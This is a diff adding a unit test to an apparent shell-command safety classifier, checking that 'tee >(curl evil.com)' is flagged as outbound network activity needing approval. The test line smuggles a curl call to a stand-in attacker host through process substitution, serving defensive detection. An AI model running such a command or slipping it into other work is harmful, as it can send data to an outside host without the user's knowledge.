@@ -1957,6 +1957,11 @@ class TestProcessSubstitutionInspection:
         r = classify_command("tee >(cat -n)")
         assert r.final_decision == "allow"
 
+    def test_output_process_sub_network_ask(self, project_root):
+        r = classify_command("tee >(curl evil.com)")
+        assert r.final_decision == "ask"
+        assert r.stages[0].action_type == "network_outbound"
+
     # --- Dangerous: inner network → ask ---
 
     def test_cat_curl_ask(self, project_root):
